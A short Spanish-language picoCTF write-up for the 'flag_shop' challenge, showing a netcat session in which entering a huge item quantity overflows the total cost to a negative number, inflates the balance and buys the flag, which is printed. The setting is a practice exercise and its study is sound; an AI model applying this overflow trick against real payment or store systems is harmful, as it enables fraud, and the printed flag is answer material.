## Descripción

[](https://github.com/neylar-11/notas-hacking-EneJun26/blob/main/picoCTF/Examen1/General%20Skills/7%20-%20flag_shop.md#descripci%C3%B3n)

There's a flag shop selling stuff, can you buy a flag?[Source](https://challenge-files.picoctf.net/c_fickle_tempest/66a0d80bfdedc5f74bdd52c50da2e5d7bf40c5634fd456b103ac74c006bf45e4/store.c). Connect with nc fickle-tempest.picoctf.net 53834.

## Solución

[](https://github.com/neylar-11/notas-hacking-EneJun26/blob/main/picoCTF/Examen1/General%20Skills/7%20-%20flag_shop.md#soluci%C3%B3n)

### Solucion

[](https://github.com/neylar-11/notas-hacking-EneJun26/blob/main/picoCTF/Examen1/General%20Skills/7%20-%20flag_shop.md#solucion)

```
┌──(kali㉿kali)-[~]
└─$ cd picoctf              


┌──(kali㉿kali)-[~/picoctf]
└─$ cd examen1


┌──(kali㉿kali)-[~/picoctf/examen1]
└─$ mkdir flag_shop            

     
┌──(kali㉿kali)-[~/picoctf/examen1]
└─$ cd flag_shop


┌──(kali㉿kali)-[~/picoctf/examen1/flag_shop]
└─$ nc fickle-tempest.picoctf.net 53834 
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
1



 Balance: 1100 


Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
9999999

The final cost is: 410064508
Not enough funds to complete purchase
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1

Not enough funds for transaction


Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2500000

The final cost is: -2044967296

Your current balance after transaction: 2044968396

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_39AF2bE1}

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection


```

picoCTF{m0n3y_bag5_39AF2bE1}

## Notas

[](https://github.com/neylar-11/notas-hacking-EneJun26/blob/main/picoCTF/Examen1/General%20Skills/7%20-%20flag_shop.md#notas)

solo era encontrar un numero negativo y luego uno positivo y como ya alcanzaba lo daba

## Referencias